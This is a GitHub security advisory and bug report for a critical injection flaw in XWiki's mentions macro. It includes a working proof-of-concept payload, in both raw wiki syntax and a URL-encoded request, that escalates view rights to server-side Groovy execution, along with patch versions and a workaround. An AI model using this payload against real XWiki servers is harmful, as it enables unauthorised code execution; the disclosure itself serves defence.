#### Description

**Steps to reproduce:**

Open the URL

```

<server>/xwiki/bin/view/Main?sheet=CKEditor.HTMLConverter&language=en&sourceSyntax=xwiki%252F2.1&stripHTMLEnvelope=true&fromHTML=false&toHTML=true&text=%7B%7Bmention%20reference%3D%22XWiki.Translation%22%20anchor%3D%22%7B%7B%2Fhtml~%7D~%7D%7B%7Basync%20async%3D~%22true~%22%20cached%3D~%22false~%22%20context%3D~%22doc.reference~%22~%7D~%7D%7B%7Bgroovy~%7D~%7Dnew%20File(~%22%2Ftmp%2Fexploit.txt~%22).withWriter%20%7B%20out%20-%3E%20out.println(~%22owned!~%22)%3B%20%7D%7B%7B%2Fgroovy~%7D~%7D%7B%7B%2Fasync~%7D~%7D%22%2F%7D%7D

```

Alternatively:

Create a page with content

```

{{mention reference="XWiki.Translation" anchor="{{/html~}~}{{async async=~"true~" cached=~"false~" context=~"doc.reference~"~}~}{{groovy~}~}new File(~"/tmp/exploit.txt~").withWriter { out -> out.println(~"owned!~"); }{{/groovy~}~}{{/async~}~}"/}}

```

(or insert this in the description of the user profile).

**Expected result**

No file /tmp/exploit.txt is created.

**Actual result**

A file /tmp/exploit.txt with content owned! is created on the server (if the server is running Linux, on Windows this might need to be adjusted to use a different path).

This demonstrates a privilege escalation to programming rights with just view rights through insufficient escaping of parameters in the mentions macro, exploited through the HTML Converter of CKEditor that allows parsing and rendering arbitrary XWiki syntax without edit rights. Alternatively, edit rights on any page (can be the user's profile) are needed.

# Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in org.xwiki.platform:xwiki-platform-mentions-ui

Critical

[surli](/surli)
published
GHSA-c5v8-2q4r-5w9v
Sep 8, 2022

## Package

maven

org.xwiki.platform:xwiki-platform-mentions-ui
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

>= 12.5-rc-1

## Patched versions

14.4, 13.10.6

## Description

### Impact

It's possible to store Javascript or groovy scripts in an mention macro anchor or reference field. The stored code is executed by anyone visiting the page with the mention.

For example, the example below will create a file at `/tmp/exploit.txt`:

```
{{mention reference="XWiki.Translation" anchor="{{/html~}~}{{async async=~"true~" cached=~"false~" context=~"doc.reference~"~}~}{{groovy~}~}new File(~"/tmp/exploit.txt~").withWriter { out -> out.println(~"owned!~"); }{{/groovy~}~}{{/async~}~}"/}}

```
### Patches

This issue has been patched on XWiki 14.4 and 13.10.6.

### Workarounds

It's possible to fix the vulnerability by updating `XWiki.Mentions.MentionsMacro` and edit the `Macro code` field of the `XWiki.WikiMacroClass` XObject.

```
<a id="$anchor" class="$stringtool.join($cssClasses, ' ')" data-reference="$services.model.serialize($reference.reference, 'default')" href="$link">$content</a>
```

Must be replaced by

```
<a id="$escapetool.xml($anchor)" class="$stringtool.join($cssClasses, ' ')" data-reference="$escapetool.xml($services.model.serialize($reference.reference, 'default'))" href="$escapetool.xml($link)">
  $escapetool.xml($content)
</a>
```

* 13.10.6: [4032dc8#diff-4fe22885f772e47d3561a05348f73921669ec12d4413b220383b73c7ae484bc4R608-R610](https://github.com/xwiki/xwiki-platform/commit/4032dc896857597efd169966dc9e2752a9fdd459#diff-4fe22885f772e47d3561a05348f73921669ec12d4413b220383b73c7ae484bc4R608-R610)

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
